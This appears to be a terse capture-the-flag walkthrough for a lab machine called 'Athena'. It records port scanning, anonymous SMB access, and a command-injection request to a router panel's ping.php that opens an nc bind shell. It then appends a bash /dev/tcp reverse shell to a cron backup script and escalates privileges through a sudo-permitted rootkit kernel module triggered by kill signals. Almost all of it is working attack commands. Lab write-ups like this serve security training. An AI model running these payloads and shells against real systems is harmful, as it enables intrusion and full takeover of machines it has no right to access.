# enum
```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3b:c8:f8:13:e0:cb:42:60:0d:f6:4c:dc:55:d8:3b:ed (RSA)
|   256 1f:42:e1:c3:a5:17:2a:38:69:3e:9b:73:6d:cd:56:33 (ECDSA)
|_  256 7a:67:59:8d:37:c5:67:29:e8:53:e8:1e:df:b0:c7:1e (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Athena - Gods of olympus
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2024-02-14T20:13:46
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: ROUTERPANEL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

```


```
smbclient -N \\\\10.10.151.101\\public
```

# foothold
## bind shell on 443
```
curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.181.233' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 71' -H $'Origin: http://10.10.76.241' -H $'Connection: close' -H $'Referer: http://10.10.76.241/myrouterpanel/' -H $'Upgrade-Insecure-Requests: 1' \
    --data-binary $'ip=10.8.153.190%20%24(nc%20-lnp%20443%20-e%20\'%2fbin%2fbash\')&\x0d\x0asubmit=' \
    $'http://10.10.76.241/myrouterpanel/ping.php'
```

## Latteral movement
$ 
```
find / -user athena -exec ls -ld {} \; 2>/dev/null | grep -v '^/run\|^/proc\|^/sys'
```
	drwx------ 17 athena athena 4096 Jul 31  2023 /home/athena
	drwxr-xr-x 2 athena www-data 4096 May 28  2023 /usr/share/backup

$
./pspy64
$
```
echo "bash -i >& /dev/tcp/10.10.151.101/123 0>&1" >> /usr/share/backup/backup.sh
```

## Privesc
```
athena@routerpanel:~$ sudo -l
	Matching Defaults entries for athena on routerpanel:
	    env_reset, mail_badpass,
	    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
	
	User athena may run the following commands on routerpanel:
	    (root) NOPASSWD: /usr/sbin/insmod /mnt/.../secret/venom.ko
```

```
modinfo /mnt/.../secret/venom.ko
```

```
kill -63 0
kill -57 0
```